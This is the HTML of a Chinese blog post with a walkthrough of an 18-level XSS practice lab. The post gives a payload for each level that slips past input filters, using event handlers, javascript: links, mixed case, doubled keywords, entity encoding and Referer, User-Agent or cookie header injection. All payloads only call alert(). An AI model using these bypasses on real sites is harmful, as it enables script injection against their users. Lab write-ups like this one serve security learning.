@@ -1,0 +1,1512 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+<!-- 🔴 修复图片防盗链（关键代码）-->
+<meta name="referrer" content="no-referrer" />
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="web安全知识," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="xss小游戏通关笔记* levle1  * level2  * level3  * level4  * level5  * level6  * level7  * level8  * level9  * level10  * level11  * level12  * level13  * level14  * level15  * level16  * level17  * level18 le">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss挑战通关笔记">
+<meta property="og:url" content="https://php00py.github.io/posts/8526b6d1.html">
+<meta property="og:site_name" content="Php00py">
+<meta property="og:description" content="xss小游戏通关笔记* levle1  * level2  * level3  * level4  * level5  * level6  * level7  * level8  * level9  * level10  * level11  * level12  * level13  * level14  * level15  * level16  * level17  * level18 le">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200317115853287.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200317120137712.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200317120431553.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200317120557529.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200317121018943.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200317121059470.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200317122250635.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200317122518937.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200317122721194.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200317122856998.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/202003171233213.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200317123316303.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200317124305396.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200317124800182.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200317125123405.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200317131147947.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200317144107833.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200317144849951.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2020031714512856.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200317145906825.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200317150303517.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200317150624597.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200317155521804.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200317154929543.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2020031715515551.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2020031715523781.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200317155945679.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200317155850119.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200317155913592.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200317155911519.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200317160038355.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200317160737969.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200317160858500.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200317160917846.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200317180010358.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200317163412266.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200317163923585.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200317164202296.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200317164320150.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200317164500225.png">
+<meta property="article:published_time" content="2020-03-17T09:03:55.000Z">
+<meta property="article:modified_time" content="2020-06-12T08:03:38.567Z">
+<meta property="article:author" content="Ranuy">
+<meta property="article:tag" content="web安全知识">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20200317115853287.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://php00py.github.io/posts/8526b6d1.html"/>
+
+
+
+
+
+  <title>xss挑战通关笔记 | Php00py</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Php00py</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description"> </h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://php00py.github.io/posts/8526b6d1.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ranuy">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/head.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Php00py">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">xss挑战通关笔记</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-17T17:03:55+08:00">
+                2020-03-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全知识</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/posts/8526b6d1.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/posts/8526b6d1.html" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/posts/8526b6d1.html" class="leancloud_visitors" data-flag-title="xss挑战通关笔记">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv">本文总阅读数 <i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  806
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  3
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="xss小游戏通关笔记"><a href="#xss小游戏通关笔记" class="headerlink" title="xss小游戏通关笔记"></a>xss小游戏通关笔记</h3><pre><code>* levle1 
+* level2 
+* level3 
+* level4 
+* level5 
+* level6 
+* level7 
+* level8 
+* level9 
+* level10 
+* level11 
+* level12 
+* level13 
+* level14 
+* level15 
+* level16 
+* level17 
+* level18 </code></pre><h2 id="levle1"><a href="#levle1" class="headerlink" title="levle1"></a>levle1</h2><p>在url中输入tt，页面输出tt<br><img src="https://img-blog.csdnimg.cn/20200317115853287.png" alt="在这里插入图片描述"><br>在url中构造这段js代码<br><code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img src="https://img-blog.csdnimg.cn/20200317120137712.png" alt="在这里插入图片描述"></p>
+<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>第二关是一个输入框，输入js代码<br><img src="https://img-blog.csdnimg.cn/20200317120431553.png" alt="在这里插入图片描述"><br>观察html页面代码，输出做了转义，但是输入没有做转义，在输入处构造js代码，注意闭合。<br><img src="https://img-blog.csdnimg.cn/20200317120557529.png" alt="在这里插入图片描述"><br>“&gt;闭合前面的&lt;”,//注入后门的内容,或者闭合后面的内容</p>
+<pre><code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;//  
+&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;</code></pre><p><img src="https://img-blog.csdnimg.cn/20200317121018943.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200317121059470.png" alt="在这里插入图片描述"></p>
+<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>第三关依然是一个输入框。输入一段js代码看html，输入和输出做了转义 ![在这里插入图片描述](<a href="https://img-" target="_blank" rel="noopener">https://img-</a><br>blog.csdnimg.cn/2020031712131059.png)<br>不能使用 <code>&lt;script&gt;</code> ,使用js中的事件<br>onmouseover<br>onclick</p>
+<pre><code>&apos;onclick=alert(1)//
+&apos;onmouseover=alert(1)//</code></pre><p><img src="https://img-blog.csdnimg.cn/20200317122250635.png" alt="在这里插入图片描述"></p>
+<h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>在输入输出处做了转义和替换<br><img src="https://img-blog.csdnimg.cn/20200317122518937.png" alt="在这里插入图片描述"><br>不能使用 <code>&lt;script&gt;</code><br>同样使用事件绕过</p>
+<pre><code>&quot;onclick=alert(1)//
+&quot;onmouseover=alert(1)//</code></pre><p><img src="https://img-blog.csdnimg.cn/20200317122721194.png" alt="在这里插入图片描述"></p>
+<h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p>输入将 <code>&lt;script&gt;</code> 代替 <code>&lt;scr_ipt&gt;</code> ,输出转义<br><img src="https://img-blog.csdnimg.cn/20200317122856998.png" alt="在这里插入图片描述"><br>事件on也被替换了o_n<br><img src="https://img-blog.csdnimg.cn/202003171233213.png" alt="hi"><br>事件中的on替换成了o_n<br><img src="https://img-blog.csdnimg.cn/20200317123316303.png" alt="在这里插入图片描述"><br>使用a标签</p>
+<pre><code>&quot;&gt;&lt;a href=javascript:alert(1)&gt;111&lt;/a&gt;
+&quot;&gt;&lt;a href=javascript:alert(1)//</code></pre><p><img src="https://img-blog.csdnimg.cn/20200317124305396.png" alt="在这里插入图片描述"></p>
+<h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p>同样，输出做了转义，输入做了替换<br><img src="https://img-blog.csdnimg.cn/20200317124800182.png" alt="在这里插入图片描述"><br>a标签也不能使用了，大小写替换</p>
+<pre><code>&quot;&gt;&lt;a HrEf=javascript:alert(1)//
+&quot;&gt;&lt;sCript&gt;alert(1)&lt;/sCript&gt;//</code></pre><p><img src="https://img-blog.csdnimg.cn/20200317125123405.png" alt="在这里插入图片描述"></p>
+<h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><p>on src 都被换成空了<br><img src="https://img-blog.csdnimg.cn/20200317131147947.png" alt="on  都被 过滤了"><br>使用双写绕过</p>
+<pre><code>&quot;&gt;&lt;scrscriptipt&gt;alert(/xss/)&lt;/scrscriptipt&gt;
+&quot;oonnclick=alert(1)//
+&quot;oonnmouseover=alert(1)//</code></pre><h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p><img src="https://img-blog.csdnimg.cn/20200317144107833.png" alt="在这里插入图片描述"><br>观察代码，输入使用htmlspecialchars函数做了html实体化，并且做了过滤替换。使用伪协议绕过。</p>
+<pre><code>javascript:alert(1)</code></pre><p>但是script被过滤了，使用编码绕过。编码其中一个字母即可</p>
+<pre><code>javascri&amp;#x70;&amp;#x74;:alert(1)</code></pre><p><img src="https://img-blog.csdnimg.cn/20200317144849951.png" alt="在这里插入图片描述"></p>
+<h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p><img src="https://img-blog.csdnimg.cn/2020031714512856.png" alt="在这里插入图片描述"><br>观察源码可以发现在第8关的基础上面，在输出点做了一个判断连接是否是http://<br>将<a href="http://1.com给注释掉了" target="_blank" rel="noopener">http://1.com给注释掉了</a></p>
+<pre><code>javascri&amp;#x70;&amp;#x74;:alert(1)//http://1.com// #使用了注释
+
+javascrip&amp;#x74;:%0dhttp://1.com%0dalert(1) #不使用注释</code></pre><p><img src="https://img-blog.csdnimg.cn/20200317145906825.png" alt="在这里插入图片描述"></p>
+<h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><p>没有了输入框，查看源码<br>尖括号&lt;&gt;都被转换成空，还有三个hidden的隐藏输入框<br><img src="https://img-blog.csdnimg.cn/20200317150303517.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200317150624597.png" alt="在这里插入图片描述"><br>构造js代码</p>
+<pre><code>hello&amp;t_sort=&quot;type=&quot;text&quot; onclick=&quot;alert(1)</code></pre><h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><p>http头部的xss<br><code>$str11=$_SERVER[&#39;HTTP_REFERER&#39;];</code> 多了一个接收http请求头的字符串<br><img src="https://img-blog.csdnimg.cn/20200317155521804.png" alt="在这里插入图片描述"><br>抓包<br><img src="https://img-blog.csdnimg.cn/20200317154929543.png" alt="在这里插入图片描述"><br>改包，添加Referer头<br><img src="https://img-blog.csdnimg.cn/2020031715515551.png" alt="在这里插入图片描述"></p>
+<pre><code>Referer:&quot; onmouseover=alert(11) type=&quot;text&quot;
+
+                Referer:&quot; onclick=&quot;alert(11)&quot; type=&quot;text</code></pre><p><img src="https://img-blog.csdnimg.cn/2020031715523781.png" alt="在这里插入图片描述"></p>
+<h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><p>同11关，只是此关是UA注入的xss<br><img src="https://img-blog.csdnimg.cn/20200317155945679.png" alt="在这里插入图片描述"></p>
+<pre><code>onmouseover=alert(11) type=&quot;text&quot;
+&quot; onclick=&quot;alert(11)&quot; type=&quot;text</code></pre><p><img src="https://img-blog.csdnimg.cn/20200317155850119.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200317155913592.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200317155911519.png" alt="在这里插入图片描述"></p>
+<h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><p>此关是cookie<br><img src="https://img-blog.csdnimg.cn/20200317160038355.png" alt="在这里插入图片描述"><br>抓包<br><img src="https://img-blog.csdnimg.cn/20200317160737969.png" alt="在这里插入图片描述"></p>
+<pre><code>&quot; onmouseover=alert(13) type=&quot;text&quot;
+&quot; onclick=&quot;alert(13)&quot; type=&quot;text</code></pre><p><img src="https://img-blog.csdnimg.cn/20200317160858500.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200317160917846.png" alt="在这里插入图片描述"></p>
+<h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><p>未看明白，百度看是需要上传一个含有xss代码的图片触发xss。这关是exif xss</p>
+<h2 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h2><p>未看明白，百度此关angularjs的ng-include，相当于PHP中的文件包含。<br>包含第一关的源码进行xss。</p>
+<pre><code>?src=&apos;level1.php?name=test&lt;img src=1 οnerrοr=alert(1)&gt;&apos;</code></pre><p>但是googleapis.com无法访问<br><img src="https://img-blog.csdnimg.cn/20200317180010358.png" alt="在这里插入图片描述"></p>
+<h2 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h2><p>查看源码，过滤了空格，script，/<br>使用%0d %0a做分割符<br><img src="https://img-blog.csdnimg.cn/20200317163412266.png" alt="在这里插入图片描述"></p>
+<pre><code>?keyword=&lt;img%0dsrc=1%0donerror=alert()&gt;</code></pre><p><img src="https://img-blog.csdnimg.cn/20200317163923585.png" alt="在这里插入图片描述"></p>
+<h2 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h2><p>输入点在url上面，输出在src中 <img src="https://img-blog.csdnimg.cn/20200317164202296.png" alt=""></p>
+<pre><code>onmouseover=alert(1)</code></pre><p><img src="https://img-blog.csdnimg.cn/20200317164320150.png" alt="在这里插入图片描述"></p>
+<h2 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h2><p>和17关一样</p>
+<pre><code>onmouseover=alert(1)</code></pre><p><img src="https://img-blog.csdnimg.cn/20200317164500225.png" alt="在这里插入图片描述"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="Ranuy 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="Ranuy 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/" rel="tag"><i class="fa fa-tag"></i> web安全知识</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/posts/74281a95.html" rel="next" title="sqlmap使用总结">
+                <i class="fa fa-chevron-left"></i> sqlmap使用总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/posts/953494c.html" rel="prev" title="通达OA文件上传+文件包含导致远程代码执行漏洞复现">
+                通达OA文件上传+文件包含导致远程代码执行漏洞复现 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/head.gif"
+                alt="Ranuy" />
+            
+              <p class="site-author-name" itemprop="name">Ranuy</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">41</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/php00py" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://blog.csdn.net/weixin_43886632" target="_blank" title="CSDn">
+                      
+                        <i class="fa fa-fw fa-globe"></i>CSDn</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.t00ls.net/" title="TOOLS" target="_blank">TOOLS</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.shentoushi.top/" title="渗透师" target="_blank">渗透师</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.chabug.org/" title="chaBug安全" target="_blank">chaBug安全</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.secshi.com/" title="安全师" target="_blank">安全师</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.cnhonkerarmy.com/forum.php" title="红盟社区" target="_blank">红盟社区</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://github.com/CHYbeta/Web-Security-Learning" title="web安全学习" target="_blank">web安全学习</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://github.com/hongriSec/Web-Security-Attack" title="web安全攻防" target="_blank">web安全攻防</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#xss小游戏通关笔记"><span class="nav-number">1.</span> <span class="nav-text">xss小游戏通关笔记</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#levle1"><span class="nav-number"></span> <span class="nav-text">levle1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level2"><span class="nav-number"></span> <span class="nav-text">level2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level3"><span class="nav-number"></span> <span class="nav-text">level3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level4"><span class="nav-number"></span> <span class="nav-text">level4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level5"><span class="nav-number"></span> <span class="nav-text">level5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level6"><span class="nav-number"></span> <span class="nav-text">level6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level7"><span class="nav-number"></span> <span class="nav-text">level7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level8"><span class="nav-number"></span> <span class="nav-text">level8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level9"><span class="nav-number"></span> <span class="nav-text">level9</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level10"><span class="nav-number"></span> <span class="nav-text">level10</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level11"><span class="nav-number"></span> <span class="nav-text">level11</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level12"><span class="nav-number"></span> <span class="nav-text">level12</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level13"><span class="nav-number"></span> <span class="nav-text">level13</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level14"><span class="nav-number"></span> <span class="nav-text">level14</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level15"><span class="nav-number"></span> <span class="nav-text">level15</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level16"><span class="nav-number"></span> <span class="nav-text">level16</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level17"><span class="nav-number"></span> <span class="nav-text">level17</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level18"><span class="nav-number"></span> <span 